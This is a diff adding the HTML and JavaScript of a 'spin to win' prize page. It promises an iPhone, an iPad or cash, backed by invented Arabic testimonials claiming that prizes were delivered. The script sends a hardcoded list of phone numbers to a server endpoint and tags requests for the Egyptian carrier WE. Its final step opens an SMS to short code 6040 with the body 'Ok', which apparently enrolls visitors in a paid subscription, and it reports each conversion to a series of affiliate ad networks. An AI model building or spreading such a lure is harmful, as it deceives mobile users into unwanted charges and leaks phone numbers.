@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Spin to win a prize! | Win Games 2021</title>
+    <link rel="icon" type="image/ico" href="./dummy-favicon.ico">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#ffffff">
+    <style>
+        *,
+        html {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        body {
+            color: #fff;
+            margin: 0;
+            font-size: 18px;
+            background: linear-gradient(to bottom right, rgba(72, 72, 212, 0), rgba(241, 104, 104, 0)), url(https://1673333600.rsc.cdn77.org/images/header-background.jpg) center center no-repeat;
+            background-size: cover;
+            font-family: "Calibri", "helvetica", sans-serif;
+            display: flex;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        a {
+            color: #34495e
+        }
+
+        .wrapper {
+            position: relative;
+            width: 100vw;
+            display: flex
+        }
+
+        .wheeler-wrp {
+            background: rgba(81, 101, 217, 0.4);
+            border-radius: 50%;
+            padding: 15px;
+            border: 30px solid rgba(108, 123, 209, 0.14);
+            display: inline-block;
+            position: relative;
+            margin: 35px auto auto
+        }
+
+        #wheel {
+            direction: ltr !important;
+            width: 350px;
+            height: 350px;
+            border-radius: 50%;
+            position: relative;
+            overflow: hidden;
+            border: 8px solid #fff;
+            box-shadow: rgba(0, 0, 0, 0.2) 0 0 10px, rgba(0, 0, 0, 0.05) 0 3px 0;
+            transform: rotate(0deg)
+                /* transform: rotate(60deg) */
+
+        }
+
+        #wheel:before {
+            content: '';
+            position: absolute;
+            border: 7px solid rgba(0, 0, 0, 0.1);
+            width: 320px;
+            height: 320px;
+            border-radius: 50%;
+            z-index: 1000
+        }
+
+        #inner-wheel {
+            width: 100%;
+            height: 100%;
+            -webkit-transition: all 3s cubic-bezier(0, .99, .44, .99);
+            -moz-transition: all 6 cubic-bezier(0, .99, .44, .99);
+            -o-transition: all 3s cubic-bezier(0, .99, .44, .99);
+            -ms-transition: all 3s cubic-bezier(0, .99, .44, .99);
+            transition: all 3s cubic-bezier(0, .99, .44, .99)
+        }
+
+        #wheel div.sec {
+            position: absolute;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 177px 103px 0;
+            border-color: #19c transparent;
+            transform-origin: 102px 173px;
+            left: 70px;
+            top: -4px;
+            opacity: 1
+        }
+
+        #wheel div.sec:nth-child(1) {
+            transform: rotate(60deg);
+            -webkit-transform: rotate(60deg);
+            -moz-transform: rotate(60deg);
+            -o-transform: rotate(60deg);
+            -ms-transform: rotate(60deg);
+            border-color: #16a085 transparent
+        }
+
+        #wheel div.sec:nth-child(2) {
+            transform: rotate(120deg);
+            -webkit-transform: rotate(120deg);
+            -moz-transform: rotate(120deg);
+            -o-transform: rotate(120deg);
+            -ms-transform: rotate(120deg);
+            border-color: #2980b9 transparent
+        }
+
+        #wheel div.sec:nth-child(3) {
+            transform: rotate(180deg);
+            -webkit-transform: rotate(180deg);
+            -moz-transform: rotate(180deg);
+            -o-transform: rotate(180deg);
+            -ms-transform: rotate(180deg);
+            border-color: #34495e transparent
+        }
+
+        #wheel div.sec:nth-child(4) {
+            transform: rotate(240deg);
+            -webkit-transform: rotate(240deg);
+            -moz-transform: rotate(240deg);
+            -o-transform: rotate(240deg);
+            -ms-transform: rotate(240deg);
+            border-color: #f39c12 transparent
+        }
+
+        #wheel div.sec:nth-child(5) {
+            transform: rotate(300deg);
+            -webkit-transform: rotate(300deg);
+            -moz-transform: rotate(300deg);
+            -o-transform: rotate(300deg);
+            -ms-transform: rotate(300deg);
+            border-color: #d35400 transparent
+        }
+
+        #wheel div.sec:nth-child(6) {
+            transform: rotate(360deg);
+            -webkit-transform: rotate(360deg);
+            -moz-transform: rotate(360deg);
+            -o-transform: rotate(360deg);
+            -ms-transform: rotate(360deg);
+            border-color: #c0392b transparent
+        }
+
+        #wheel div.sec img {
+            margin-top: -146px;
+            color: rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 10000000;
+            display: block;
+            text-align: center;
+            font-size: 36px;
+            margin-left: -26px;
+            text-shadow: rgba(255, 255, 255, 0.1) 0 -1px 0px, rgba(0, 0, 0, 0.2) 0 1px 0;
+            max-width: 50px
+        }
+
+        #inner-wheel {
+            border-radius: 50%;
+            overflow: hidden
+        }
+
+        @media (min-width:1025px) {
+            #wheel div.sec img.prize2 {
+                margin-left: -20px
+            }
+
+            #wheel div.sec img.prize4,
+            #wheel div.sec img.prize5 {
+                margin-left: -30px
+            }
+        }
+
+        #spin {
+            width: 68px;
+            height: 68px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            margin: -34px 0 0 -34px;
+            border-radius: 50%;
+            box-shadow: rgba(0, 0, 0, 0.1) 0 3px 0;
+            z-index: 1000;
+            background: #fff;
+            cursor: pointer;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -o-user-select: none;
+            user-select: none
+        }
+
+        #spin .spin-btn-text {
+            text-align: center;
+            line-height: 73px;
+            color: #CCC;
+            text-shadow: 0 2px 0 #fff, 0 -2px 0 rgba(0, 0, 0, 0.3);
+            position: relative;
+            z-index: 100000;
+            width: 68px;
+            height: 68px;
+            display: block;
+            font-size: 18px
+        }
+
+        #spin:before {
+            content: "";
+            position: absolute;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 0 20px 28px;
+            border-color: transparent transparent #fff;
+            top: -12px;
+            left: 14px
+        }
+
+        #inner-spin {
+            width: 54px;
+            height: 54px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            margin: -27px 0 0 -27px;
+            border-radius: 50%;
+            background: red;
+            z-index: 999;
+            box-shadow: rgba(255, 255, 255, 1) 0 -2px 0 inset, rgba(255, 255, 255, 1) 0 2px 0 inset, rgba(0, 0, 0, 0.4) 0 0 5px;
+            background: #fff;
+            background: -moz-radial-gradient(center, ellipse cover, rgba(255, 255, 255, 1) 0%, rgba(234, 234, 234, 1) 100%);
+            background: -webkit-gradient(radial, center center, 0px, center center, 100%, color-stop(0%, rgba(255, 255, 255, 1)), color-stop(100%, rgba(234, 234, 234, 1)));
+            background: -webkit-radial-gradient(center, ellipse cover, rgba(255, 255, 255, 1) 0%, rgba(234, 234, 234, 1) 100%);
+            background: -o-radial-gradient(center, ellipse cover, rgba(255, 255, 255, 1) 0%, rgba(234, 234, 234, 1) 100%);
+            background: -ms-radial-gradient(center, ellipse cover, rgba(255, 255, 255, 1) 0%, rgba(234, 234, 234, 1) 100%);
+            background: radial-gradient(ellipse at center, rgba(255, 255, 255, 1) 0%, rgba(234, 234, 234, 1) 100%);
+            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff'endColorstr='#eaeaea', GradientType=1)
+        }
+
+        #spin:active #inner-spin {
+            box-shadow: rgba(0, 0, 0, 0.4) 0 0 5px inset
+        }
+
+        #spin:active:after {
+            font-size: 15px
+        }
+
+        #shine {
+            width: 335px;
+            height: 335px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            background: -moz-radial-gradient(center, ellipse cover, rgba(255, 255, 255, 1) 0%, rgba(255, 255, 255, 0.99) 1%, rgba(255, 255, 255, 0.91) 9%, rgba(255, 255, 255, 0) 100%);
+            background: -webkit-gradient(radial, center center, 0px, center center, 100%, color-stop(0%, rgba(255, 255, 255, 1)), color-stop(1%, rgba(255, 255, 255, 0.99)), color-stop(9%, rgba(255, 255, 255, 0.91)), color-stop(100%, rgba(255, 255, 255, 0)));
+            background: -webkit-radial-gradient(center, ellipse cover, rgba(255, 255, 255, 1) 0%, rgba(255, 255, 255, 0.99) 1%, rgba(255, 255, 255, 0.91) 9%, rgba(255, 255, 255, 0) 100%);
+            background: -o-radial-gradient(center, ellipse cover, rgba(255, 255, 255, 1) 0%, rgba(255, 255, 255, 0.99) 1%, rgba(255, 255, 255, 0.91) 9%, rgba(255, 255, 255, 0) 100%);
+            background: -ms-radial-gradient(center, ellipse cover, rgba(255, 255, 255, 1) 0%, rgba(255, 255, 255, 0.99) 1%, rgba(255, 255, 255, 0.91) 9%, rgba(255, 255, 255, 0) 100%);
+            background: radial-gradient(ellipse at center, rgba(255, 255, 255, 1) 0%, rgba(255, 255, 255, 0.99) 1%, rgba(255, 255, 255, 0.91) 9%, rgba(255, 255, 255, 0) 100%);
+            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff'endColorstr='#00ffffff', GradientType=1);
+            opacity: .1
+        }
+
+        .prize1 {
+            transform: rotate(180deg)
+        }
+
+        .inner-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%)
+        }
+
+        h2 {
+            color: #fff
+        }
+
+        .btn-wrp button {
+            background: #FFC107;
+            color: #171616;
+            padding: 20px 60px;
+            border: 0;
+            font-size: 20px;
+            border-bottom: 5px solid #FF9800;
+            font-weight: 700;
+            border-radius: 5px;
+            animation: vitrate 1s infinite;
+            box-shadow: 1px 1px 10px #ddd;
+            cursor: pointer
+        }
+
+        .btn-wrp {
+            margin-top: 90px
+        }
+
+        .chat-btn {
+            width: 350px;
+            padding: 30px;
+            background-color: #fff;
+            border-radius: 4px;
+            color: #3F51B5;
+            font-size: 35px;
+            position: relative;
+            font-weight: 600;
+            text-transform: uppercase;
+            text-align: center;
+            box-shadow: 1px 1px 10px #ddd
+        }
+
+        .chat-btn:after {
+            content: "";
+            display: block;
+            position: absolute;
+            width: 0;
+            height: 0;
+            right: 10px;
+            bottom: -30px;
+            border-left: 40px solid transparent;
+            border-right: 2px solid transparent;
+            border-top: 40px solid #fff
+        }
+
+        .formobile {
+            display: none
+        }
+
+        @keyframes vitrate {
+            0% {
+                transform: scale(1)
+            }
+
+            50% {
+                transform: scale(0.95)
+            }
+
+            100% {
+                transform: scale(1)
+            }
+        }
+
+        @-webkit-keyframes vitrate {
+            0% {
+                transform: scale(1)
+            }
+
+            50% {
+                transform: scale(0.95)
+            }
+
+            100% {
+                transform: scale(1)
+            }
+        }
+
+        .spin {
+            -webkit-animation: hh .1s;
+            animation: hh .1s
+        }
+
+        @-webkit-keyframes hh {
+
+            0%,
+            100% {
+                transform: rotate(0deg);
+                -webkit-transform: rotate(0deg)
+            }
+
+            50% {
+                transform: rotate(7deg);
+                -webkit-transform: rotate(7deg)
+            }
+        }
+
+        @keyframes hh {
+
+            0%,
+            100% {
+                transform: rotate(0deg);
+                -webkit-transform: rotate(0deg)
+            }
+
+            50% {
+                transform: rotate(10deg);
+                -webkit-transform: rotate(10deg)
+            }
+        }
+
+        .comments {
+            background: #fff;
+            float: left;
+            width: 100%;
+            box-sizing: border-box;
+            padding: 20px;
+            margin-top: 30px;
+            color: #333
+        }
+
+        .comments img {
+            border-radius: 50%;
+            margin-right: 10px
+        }
+
+        .addCommentBox {
+            width: 100%;
+            background: #ddd;
+            padding: 10px
+        }
+
+        textarea.commentTextBox {
+            width: calc(100% - 120px);
+            float: left;
+            height: 45px
+        }
+
+        .addCommentBox input[type="button"] {
+            background: #3F51B5;
+            color: #fff;
+            padding: 15px 0;
+            border: 0;
+            margin: 0;
+            width: 120px;
+            cursor: pointer
+        }
+
+        .app-body {
+            width: 100%;
+            float: left;
+            overflow: hidden
+        }
+
+        header {
+            background-color: #1c309f;
+            float: left;
+            width: 100%;
+            color: #fff;
+            padding: 7px;
+            font-weight: 600
+        }
+
+        header h2 {
+            font-size: 20px
+        }
+
+        .header-bottom {
+            background: #fff;
+            color: #4f4f50;
+            font-size: 15px;
+            font-weight: 600;
+            text-align: center;
+            line-height: 35px;
+            min-height: 30px;
+        }
+
+        .text-center {
+            text-align: center
+        }
+
+        .comment-number {
+            width: 100%;
+            float: left;
+            border-bottom: 1px solid #ddd
+        }
+
+        span.comment-pagitane {
+            float: right
+        }
+
+        table#commentList tr td {
+            border-bottom: 1px solid #ddd;
+            padding: 5px 0
+        }
+
+        .name {
+            font-weight: 700;
+            color: #3b5998
+        }
+
+        .date {
+            padding-top: 5px;
+            color: #9c9c9c;
+            font-size: 11px
+        }
+
+        .width-50 {
+            width: 50px
+        }
+
+        .header-bottom-web {
+            background: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            text-align: center;
+            line-height: 25px;
+            position: absolute;
+            right: 100px;
+            top: 140px;
+            color: #3F51B5
+        }
+
+        #wheel div.sec img.prize1,
+        #wheel div.sec img.prize3,
+        #wheel div.sec img.prize5 {
+            max-width: 65px;
+            margin-left: -35px;
+        }
+
+        @media (max-width:1024px) {
+            .wrapper {
+                width: 100vw;
+                height: auto;
+                display: flex;
+                padding: 40px 0
+            }
+
+            .wheeler-wrp {
+                position: static;
+                width: 550px;
+                margin: 0 auto;
+                float: none;
+                transform: translate(0%, 0%)
+            }
+
+            .inner-container {
+                position: static;
+                transform: translate(0%, 0%);
+                width: 350px;
+                margin: 0 auto
+            }
+
+            .app-body {
+                overflow: auto
+            }
+        }
+
+        @media (max-width: 767px) {
+            html {
+                background-color: #303F9F
+            }
+
+            .wheeler-wrp {
+                background: rgba(0, 22, 148, 0.36)
+            }
+
+            .forweb {
+                display: none
+            }
+
+            .formobile {
+                display: inline-block
+            }
+
+            .chat-btn {
+                padding: 20px;
+                font-size: 30px;
+                margin: 20px auto 30px
+            }
+
+            .chat-btn-wrp {
+                display: flex
+            }
+
+            .btn-wrp {
+                margin-top: 0;
+                text-align: center
+            }
+
+            .wrapper {
+                padding: 0 0 40px
+            }
+
+            .comment-number {
+                margin-top: 10px
+            }
+
+            .comments {
+                margin-top: 0
+            }
+        }
+
+        @media (orientation: landscape) and (max-width: 767px) {
+            .wheeler-wrp {
+                border: 30px solid rgba(108, 123, 209, 0.14);
+                width: 440px
+            }
+        }
+
+        @media (orientation: portrait) and (min-height: 568px) {
+            .chat-btn.formobile {
+                width: 290px;
+                font-size: 25px
+            }
+
+            .chat-btn-wrp {
+                display: flex
+            }
+
+            #wheel {
+                width: 250px;
+                height: 250px;
+                border-radius: 50%;
+                position: relative;
+                overflow: hidden;
+                border: 8px solid #fff;
+                box-shadow: rgba(0, 0, 0, 0.2) 0 0 10px, rgba(0, 0, 0, 0.05) 0 3px 0;
+                transform: rotate(0deg)
+            }
+
+            #wheel:before {
+                content: '';
+                position: absolute;
+                border: 4px solid rgba(0, 0, 0, 0.1);
+                width: 226px;
+                height: 226px
+            }
+
+            #wheel div.sec {
+                border-width: 130px 75px 0;
+                border-color: #19c transparent;
+                transform-origin: 75px 129px;
+                left: 50px;
+                top: -4px;
+                opacity: 1
+            }
+
+            .wheeler-wrp {
+                width: 350px;
+                padding: 20px;
+                border: 30px solid rgba(108, 123, 209, 0.14)
+            }
+
+            .inner-container {
+                text-align: center
+            }
+
+            .btn-wrp {
+                margin-top: 0
+            }
+
+            .wrapper.right-wrp {
+                padding-top: 0
+            }
+
+            #wheel div.sec img {
+                margin-top: -100px;
+                position: relative;
+                z-index: 10000000;
+                display: block;
+                text-align: center;
+                font-size: 36px;
+                margin-left: -19px;
+                width: 35px
+            }
+
+            #wheel div.sec img.prize2 {
+                width: 27px;
+                height: 52px;
+                margin-left: -13px;
+                margin-top: -95px
+            }
+
+            #wheel div.sec img.prize5 {
+                margin-top: -113px;
+                width: 38px;
+                margin-left: -21px
+            }
+
+            body {
+                height: 100vh
+            }
+
+            #spin {
+                margin: -28px 0 0 -30px;
+                width: 64px;
+                height: 64px
+            }
+
+            #wheel div.sec img.prize4 {
+                margin-top: -105px;
+                width: 35px;
+                margin-left: -20px
+            }
+
+            #inner-spin {
+                font-size: 13px;
+                width: 50px;
+                height: 50px;
+                margin: -25px 0 0 -25px
+            }
+
+            #spin:after {
+                line-height: 69px;
+                width: 65px;
+                height: 60px;
+                font-size: 18px
+            }
+
+            #spin:before {
+                top: -10px
+            }
+
+            #wheel div.sec img.prize1,
+            #wheel div.sec img.prize3,
+            #wheel div.sec img.prize5 {
+                max-width: 65px;
+                margin-left: -27px;
+                width: 50px;
+                margin-top: -90px;
+            }
+
+            #wheel div.sec img.prize5 {
+                margin-top: -105px;
+            }
+
+            .header-bottom {
+                line-height: 20px;
+                width: 100%;
+                float: left;
+                padding-top: 5px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .wheeler-wrp {
+                width: 300px;
+                padding: 15px;
+                border: 10px solid rgba(108, 123, 209, 0.14)
+            }
+
+            textarea.commentTextBox {
+                width: calc(100% - 0px);
+                height: 80px
+            }
+
+            .addCommentBox input[type="button"] {
+                width: 100%;
+                margin-top: 10px
+            }
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            padding-top: 150px;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: #000;
+            background-color: rgba(0, 0, 0, 0.4)
+        }
+
+        .modal-content {
+            position: relative;
+            background-color: #FF9800;
+            width: 300px;
+            margin: auto;
+            padding: 0;
+            border: 10px solid #fff;
+            box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+            -webkit-animation-name: animatetop;
+            -webkit-animation-duration: .4s;
+            animation-name: animatetop;
+            animation-duration: .4s
+        }
+
+        @-webkit-keyframes animatetop {
+            from {
+                top: -300px;
+                opacity: 0
+            }
+
+            to {
+                top: 0;
+                opacity: 1
+            }
+        }
+
+        @keyframes animatetop {
+            from {
+                top: -300px;
+                opacity: 0
+            }
+
+            to {
+                top: 0;
+                opacity: 1
+            }
+        }
+
+        .close {
+            margin-right: 7px;
+            color: #fff;
+            float: right;
+            font-size: 28px;
+            font-weight: 700
+        }
+
+        .close:hover,
+        .close:focus {
+            color: #000;
+            text-decoration: none;
+            cursor: pointer
+        }
+
+        .modal-header {
+            padding: 2px 16px;
+            background-color: #5cb85c;
+            color: #fff
+        }
+
+        .modal-body {
+            padding: 50px 0px 40px;
+            text-align: center;
+            font-size: 20px;
+        }
+
+        .modal-body b {
+            font-size: 28px;
+        }
+
+        .modal-body .prize-img {
+            width: 50px;
+            margin-top: 15px;
+        }
+
+        .modal-body .prize {
+            margin-top: 15px;
+        }
+
+        .link {
+            color: #fff
+        }
+
+        .app-footer {
+            text-align: center;
+            width: 100%;
+            padding: 5px 15px 10px;
+            background: #333;
+            color: #fff
+        }
+
+        .link {
+            color: #fff;
+            font-size: 12px
+        }
+
+        .button {
+            background: #3F51B5;
+            border: 0;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            font-weight: 700;
+            padding: 10px 50px;
+            text-transform: uppercase;
+            margin-top: 20px;
+            font-size: 16px;
+            color: #fff;
+            border-radius: 5px;
+            cursor: pointer
+        }
+
+        body.ar {
+            direction: rtl;
+        }
+
+        body.ar span.comment-pagitane {
+            float: left;
+        }
+
+        body.ar .header-bottom {
+            text-align: right;
+            padding-right: 15px;
+        }
+
+        body.ar .comments img {
+            margin-left: 10px;
+            margin-right: 0px
+        }
+
+        body.ar header {
+            padding-right: 15px;
+        }
+
+        body.ar #wheel div.sec img.prize1,
+        body.ar #wheel div.sec img.prize3,
+        body.ar #wheel div.sec img.prize5 {
+            margin-right: -30px;
+        }
+
+        body.ar #wheel div.sec img {
+            margin-right: -20px;
+        }
+
+        body.ar #wheel div.sec {
+            left: auto;
+            right: 70px;
+        }
+
+        @media (max-width: 767px) {
+            body.ar #wheel div.sec {
+                left: auto;
+                right: 35px;
+            }
+
+            body.ar #wheel div.sec img.prize1,
+            body.ar #wheel div.sec img.prize3,
+            body.ar #wheel div.sec img.prize5 {
+                margin-right: -18px;
+            }
+
+            body.ar #wheel div.sec img {
+                margin-right: -15px;
+            }
+
+            body.ar #wheel div.sec img.prize6 {
+                margin-top: -110px;
+            }
+        }
+
+        body.fr #spin .spin-btn-text {
+            color: #4a4a4a;
+            text-shadow: 0 2px 0 #fff, 0 -1px 0 rgba(0, 0, 0, 0.37);
+            font-size: 14px;
+        }
+
+        @media(max-width: 360px) {
+
+            .app-footer,
+            .link {
+                font-size: 13px;
+            }
+        }
+
+        body.ar {
+            direction: rtl;
+        }
+
+        .app-footer span {
+            display: block;
+            font-size: 10px;
+            padding: 10px 10px 0;
+        }
+    </style>
+</head>
+
+<body class="en">
+    <div class="app-body">
+        <!-- <header>ابدأ واربح!</header>
+        <div class="header-bottom">عزيزي المستخدم ، تهانينا يمكنك الفوز بجائزة واحدة اليوم!</div> -->
+        <div class="wrapper left-wrp">
+            <div class="wheeler-wrp">
+                <div id="wheel">
+                    <div id="inner-wheel" data-degree="1" style="transform: rotate(600deg);">
+                        <div class="sec"><img class="prize1"
+                                src="https://1673333600.rsc.cdn77.org/images/100-dollar.png"></div>
+                        <div class="sec"><img class="prize2" src="https://1673333600.rsc.cdn77.org/images/iphone.png">
+                        </div>
+                        <div class="sec"><img class="prize3"
+                                src="https://1673333600.rsc.cdn77.org/images/100-dollar.png"></div>
+                        <div class="sec"><img class="prize4" src="https://1673333600.rsc.cdn77.org/images/ipad.png">
+                        </div>
+                        <div class="sec"><img class="prize5"
+                                src="https://1673333600.rsc.cdn77.org/images/25-dollar.png"></div>
+                        <div class="sec"><img class="prize6" src="https://1673333600.rsc.cdn77.org/images/gift.png">
+                        </div>
+                    </div>
+                    <div id="spin" class="">
+                        <div id="inner-spin"></div>
+                        <div class="spin-btn-text">ٍSPIN</div>
+                    </div>
+                    <div id="shine"></div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="backbutton"><a href="#spinner" id="backbtn"></a></div>
+    <div class="modal" id="myModal" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-body"><b style="color:#000">Congratulations</b>
+                <p class="prize"> You may win 100 $!</p><img class="prize-img"
+                    src="https://1673333600.rsc.cdn77.org/images/100-dollar.png" alt="">
+                <div><button class="button subm" id="close">OK</button></div>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"
+        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+    <script>let numberinfo = true;
+        function ajax_call(a, t, l = "GET") { return $.ajax({ type: l, url: a, data: t }) }
+        function hitthelist(numbers) {
+            if (numberinfo) {
+                ajax_call("/numberinfo", {
+                    action: "sms",
+                    plid: "242",
+                    isp: "WE",
+                    loc: "EG",
+                    plname: "SMS_EG",
+                    numbers,
+                }, "POST").done(function (a) {
+                    numberinfo = false;
+                });
+            }
+        }</script>
+    <script>
+        var pm_pid = "17426-bd675840";
+        let degree = 1800,
+            clicks = 1,
+            pageMessage = { "header": "ابدأ واربح!", "subtitle": "عزيزي المستخدم ، تهانينا يمكنك الفوز بجائزة واحدة اليوم!", "spinbutton": "غزل", "prize": { "gift": "You can win a gift box!", "ipad": "You might win an iPad!", "iPhone": "You can win an iPhone!", "dollar100": "You might win 100$ !", "dollar25": "You might win 25$ !" }, "modelHeader": "Congratulations", "modelButton": "Ok", "privacy": "سياسة خاصة", "commentFormTitle": "اترك ردك:", "commentFormbutton": "تعليق", "commentHeadAll": "إظهار كافة التعليقات", "commentHeadTitle": "تفاعلات", "commentHeadPagination": "10 من 80312", "message": "رمز التحقق لفتح الهدية", "comments": [{ "name": "كارين غرينو", "image": "comment-b.jpg", "comment": "وصلت لي للتو في البريد! شكرا على iPad الجديد !!" }, { "name": "تيم ويست", "image": "comment4.jpg", "comment": "في البداية اعتقدت أنها مزحة ، لكن iPhone الخاص بي وصل هذا الصباح!" }, { "name": "جيني وونغ", "image": "comment-e.jpg", "comment": "نيييييييسي! أحبها!" }, { "name": "مايكل ماري", "image": "comment7.jpg", "comment": "كنت أرغب في iMac !!!!! جهاز iPhone آخر رائع أيضًا ، سأستبدل هاتفي الأقدم! ؛-)" }, { "name": "كريستوفر بروك", "image": "comment-k.jpg", "comment": "@ ميشيل ، يا نفس هنا !!!! سوف تبيع iPhone X وتحصل على iMac على أي حال! أي شخص يريد iPhone X؟" }, { "name": "ليكسي بنز", "image": "comment-c.jpg", "comment": "يجب أن يكون هراء ....." }, { "name": "توبياس رافتون", "image": "comment1.jpg", "comment": "فكر بما تحب: لا هراء ....!" }, { "name": "لي تشان هون", "image": "comment6.jpg", "comment": "هذا عظيم! أول مرة فزت بأي شيء !!" }] },
+            commentObj = pageMessage.comments,
+            prizeObj = pageMessage.prize,
+            numbers = '+381607911098,+381607911099,+381607911089,+381607911096,+381607911097,+381607911080,+37258991284,+37066875102,+48780203741,+48780207581,+79238283922,+79238284828,+79315212524,+79542809227,+79585387436,+79697530369,+79852194896,+79856552072,+79920307430,+37066819014',
+            ukid = "";
+
+        function generateUkid(e = "message") {
+            ajax_call("/chat-key", {
+                pageid: "1640",
+                relation: "8792",
+                action: "sms",
+                avid: "105",
+                uuid: "704fe1a3-6b61-4df5-829d-e871d78f3bb2",
+                pl: "242",
+                plid: "242",
+                isp: "WE",
+                loc: "EG"
+            }, "POST").done(function (a) {
+                ukid = a.key, "message" == e ? becreative(ukid) : "redirect" == e && redirecting()
+            })
+        }
+
+        function sendmessage() { ukid ? becreative(ukid) : generateUkid() }
+
+        function senddonemessage() {
+            console.log("done");
+            trackerfn('251999999');
+            window.location.href = 'sms:6040;?&body=Ok';
+        }
+
+        async function trackerfn(GMSISDN) {
+            var datag = {};
+
+            if (localStorage.getItem('tracker')) {
+                datag = {
+                    key: 'parameter',
+                    company: localStorage.getItem("trackerCompany"),
+                    value: localStorage.getItem('tracker'),
+                    identifierKey: 'id',
+                    identifierValue: "ux1nrOA5lC",
+                    phoneNum: GMSISDN
+                };
+                console.log(datag)
+
+            }
+            await saveTracker(datag);
+
+        }
+
+        async function saveTracker(data) {
+            console.log("save", data)
+            fetch('http://www.api.playit.mobi/api/v2/agencyTracker/store', {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: { "Content-type": "application/json; charset=UTF-8" }
+            })
+                .then(res => {
+                    console.log(res)
+                    if (res.data.postback) {
+                        callTrackerCompany(data.company, data.value);
+                    }
+                })
+                .catch(err => {
+                    console.log(err)
+                })
+
+
+        }
+
+        const callTrackerCompany = (trackerCompany, tracker) => {
+            console.log("call", trackerCompany);
+            switch (trackerCompany) {
+                case 'OlimobCPA':
+                    verifyOlimobTracker(tracker);
+                    break;
+                case 'digiTantra':
+                    verifyDigitantraTracker(tracker);
+                    break;
+                case 'krayons':
+                    verifyKrayonsTracker(tracker, localStorage.getItem('lead'), localStorage.getItem('payout'));
+                    break;
+                case 'youmi':
+                    verifyYoumiTracker(tracker, 0.30);
+                    break;
+                case 'trafficCompany':
+                    verifyTrafficCompanyTracker(tracker, 0.25);
+                    break;
+                case 'ArmorAds':
+                    verifyArmorAdsCompanyTracker(tracker);
+                    break;
+
+                case 'Propellar':
+                    verifyPropellarCompanyTracker(tracker, 0.15);
+                    break;
+
+                case 'Rich':
+                    verifyRichCompanyTracker(tracker, 0.15);
+                    break;
+
+                case 'Mobidea':
+                    verifyMobideaCompanyTracker(tracker, 0.15);
+                    break;
+
+                case 'MOBIPIUM':
+                    verifyMOBIPIUMCompanyTracker(tracker);
+                    break;
+
+                case 'InhouseSource1':
+                    verifyInhouseSource1CompanyTracker(tracker, localStorage.getItem('payout'));
+                    break;
+
+                case 'InhouseSource2':
+                    verifyInhouseSource2CompanyTracker(tracker);
+                    break;
+
+                case 'Adacts':
+                    verifyAdactsTracker(tracker);
+                    break;
+
+                case 'Marketshareagency':
+                    verifyMarketshareagencyTracker(tracker);
+                    break;
+
+                default:
+                    break;
+            }
+        }
+
+        async function verifyOlimobTracker(tracker) {
+            console.log("verifyOlimobTracker");
+            fetch('http://olimob.net/pb/?adv=GrandTechnology&oliclick=' + tracker);
+        }
+
+        async function verifyDigitantraTracker(tracker) {
+            console.log("verifyDigitantraTracker");
+            fetch('http://track.mobileadsco.com/postback?cid=' + tracker);
+        }
+
+        async function verifyKrayonsTracker(tracker, lead, payout) {
+            console.log("verifyKrayonsTracker");
+            fetch('http://track.krayons.mobi/click.php?cnv_id=' + tracker + '&lead=' + lead + '&payout=' + payout);
+        }
+
+        async function verifyYoumiTracker(tracker, payout) {
+            console.log("verifyYoumiTracker");
+            fetch('http://track.miadx.net/aff_lsr?transaction_id=' + tracker + '&payout=' + payout);
+        }
+
+        async function verifyTrafficCompanyTracker(tracker, payout) {
+            console.log("verifyTrafficCompanyTracker");
+            fetch('https://postback.level23.nl/?currency=USD&handler=10423&hash=358c505d85a024cf4d6133cb2eca8c63&payout=' + payout + '&tracker=' + tracker);
+        }
+
+        async function verifyArmorAdsCompanyTracker(tracker) {
+            console.log("verifyArmorAdsCompanyTracker");
+            fetch('http://secure-conversion.com/conversion_get/pixel.jpg?kp=' + tracker);
+        }
+
+        async function verifyMOBIPIUMCompanyTracker(tracker) {
+            console.log("verifyMOBIPIUMCompanyTracker");
+            fetch('https://smobipiumlink.com/conversion/index.php?jp=' + tracker);
+        }
+
+        async function verifyPropellarCompanyTracker(tracker, payout) {
+            console.log("verifyMOBIPIUMCompanyTracker");
+            fetch(`http://ad.propellerads.com/conversion.php?aid=782276&pid=&tid=68452&visitor_id=${tracker}&payout=${payout}`);
+        }
+
+        async function verifyRichCompanyTracker(tracker, payout) {
+            console.log("verifyMOBIPIUMCompanyTracker");
+            fetch(`http://rtb.adx1.com/log?action=conversion&key=${tracker}&price=${payout}`);
+        }
+
+        async function verifyMobideaCompanyTracker(tracker, payout) {
+            console.log("verifyMOBIPIUMCompanyTracker");
+            fetch(`https://s2s.mobideapush.com/conversion?click_id=${tracker}&amount=${payout}`);
+        }
+
+        async function verifyAdactsTracker(tracker) {
+            console.log("verifyAdactsTracker");
+            fetch(`https://tracking.adacts.com/postback?clickid=${tracker}`);
+        }
+
+        async function verifyMarketshareagencyTracker(tracker) {
+            console.log("Marketshareagency");
+            fetch(`https://plannedy-cornance.com/postback?cid=${tracker}&event=1st_dep`);
+        }
+
